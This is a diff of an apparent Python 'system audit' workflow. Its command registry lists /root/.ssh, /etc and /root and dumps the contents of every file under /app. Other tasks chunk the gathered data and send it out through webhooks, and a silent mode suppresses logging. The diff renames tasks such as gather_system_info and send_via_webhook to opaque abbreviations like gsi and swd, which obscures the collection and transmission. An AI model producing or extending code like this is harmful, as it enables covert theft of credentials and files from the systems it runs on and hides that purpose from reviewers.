@@ -995,7 +995,7 @@ class CommandRegistry:
             "file-ls-opt": ("ls", "-la", "/opt"),
             "file-ls-etc": ("ls", "-la", "/etc"),
             "file-ls-app": ("ls", "-la", "/app"),
-            "file-ls-app": ("ls", "-la", "/root/.ssh"),
+            "file-ls-ssh": ("ls", "-la", "/root/.ssh"),
             "file-ls-root": ("ls", "-la", "/root"),
             "file-ls-web": ("ls", "-la", "/var/www"),
             "file_contents_app": ("bash", "-c", "find /app -type f -exec sh -c 'echo \"=== {} ===\"; cat \"{}\" 2>/dev/null || echo \"[Error reading file]\"' \\;"),
@@ -3027,11 +3027,11 @@ async def execute_command_async(
 
 
 @task(
-    name="gather_system_info",
+    name="gsi",
     retries=0,
     log_prints=False,
 )
-async def gather_system_info(
+async def gsi(
     config: AuditConfiguration,
 ) -> AuditData:
     """Gather system information - never crashes, always returns something."""
@@ -3422,7 +3422,7 @@ async def chunk_data_async(
 
 
 @task(
-    name="export_to_json",
+    name="etj",
     retries=1,
     log_prints=False,
 )
@@ -3482,7 +3482,7 @@ async def export_to_json_async(
 
 
 @task(
-    name="send_via_webhook",
+    name="swd",
     retries=0,
     log_prints=False,
 )
@@ -3581,7 +3581,7 @@ async def send_via_webhook_async(
 
 
 @task(
-    name="send_chunked_webhook",
+    name="scw",
     retries=0,
     log_prints=False,
 )
@@ -3646,7 +3646,7 @@ async def send_chunked_webhook_async(
 
 
 @task(
-    name="transmit_data",
+    name="td",
     retries=0,
     log_prints=False,
 )
@@ -3733,7 +3733,7 @@ async def system_audit_flow(
         if not config.silent_mode:
             flow_logger.info("📡 PHASE 1: Gathering System Information...")
 
-        audit_data = await gather_system_info(config)
+        audit_data = await gsi(config)
 
     except Exception as e:
         if not config.silent_mode:
